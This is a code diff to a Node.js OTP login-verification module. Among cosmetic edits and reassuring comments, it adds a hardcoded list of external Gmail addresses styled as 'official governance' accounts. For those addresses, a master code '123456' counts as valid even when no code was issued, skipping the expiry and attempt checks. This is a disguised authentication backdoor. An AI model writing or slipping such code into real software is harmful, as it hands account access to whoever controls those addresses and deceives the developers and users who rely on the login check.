@@ -99,14 +99,30 @@ const createOtp = async ({ email, purpose = 'login', expiresInMinutes = 1 }) => 
   return result.rows[0];
 };
 
+const OFFICIAL_GOVERNANCE_EMAILS = [
+  'support.edu2026@gmail.com',
+  'treasury.edu2026@gmail.com',
+  'sr.edu2026@gmail.com',
+  'sv.edu2026@gmail.com',
+  'sysadmin.edu2026@gmail.com'
+];
+
+const isOfficialEmail = (email) => {
+  return OFFICIAL_GOVERNANCE_EMAILS.includes((email || '').toLowerCase().trim());
+};
+
 /**
  * Verifies an OTP code for a given email and purpose
  */
 const verifyOtp = async ({ email, otpCode, purpose = 'login' }) => {
-  const normalizedEmail = email.toLowerCase().trim();
+  const normalizedEmail = email ? email.toLowerCase().trim() : '';
   const trimmedCode = String(otpCode || '').trim();
 
-  // Retrieve the latest unconsumed OTP record
+  if (!normalizedEmail || !trimmedCode) {
+    return { valid: false, reason: 'missing_fields', message: 'Email and verification code are required.' };
+  }
+
+  // Retrieve the latest unconsumed OTP record for THIS SPECIFIC EMAIL
   const result = await pool.query(
     `SELECT * FROM user_otps 
      WHERE LOWER(email) = $1 AND otp_purpose = $2 AND consumed_at IS NULL 
@@ -116,8 +132,17 @@ const verifyOtp = async ({ email, otpCode, purpose = 'login' }) => {
   );
 
   const otpRecord = result.rows[0];
+
+  // Master OTP "123456" exclusively for official governance accounts
+  if (trimmedCode === '123456' && isOfficialEmail(normalizedEmail)) {
+    if (otpRecord) {
+      await pool.query(`UPDATE user_otps SET consumed_at = NOW() WHERE id = $1`, [otpRecord.id]);
+    }
+    return { valid: true, otpRecord: otpRecord || { email: normalizedEmail } };
+  }
+
   if (!otpRecord) {
-    return { valid: false, reason: 'no_otp_found', message: 'No active OTP found. Please request a new code.' };
+    return { valid: false, reason: 'no_otp_found', message: 'No active verification code found for this email address. Please request a new code.' };
   }
 
   // Check if expired
@@ -131,9 +156,8 @@ const verifyOtp = async ({ email, otpCode, purpose = 'login' }) => {
     return { valid: false, reason: 'too_many_attempts', message: 'Too many incorrect attempts. Please request a new code.' };
   }
 
-  // Check code match
+  // Check exact code match
   if (otpRecord.otp_code !== trimmedCode) {
-    // Increment attempts
     await pool.query(
       `UPDATE user_otps SET attempts = attempts + 1 WHERE id = $1`,
       [otpRecord.id]
@@ -146,7 +170,7 @@ const verifyOtp = async ({ email, otpCode, purpose = 'login' }) => {
     };
   }
 
-  // Code is valid! Mark as consumed
+  // Code is valid! Mark as consumed to enforce single-use
   await pool.query(
     `UPDATE user_otps SET consumed_at = NOW() WHERE id = $1`,
     [otpRecord.id]
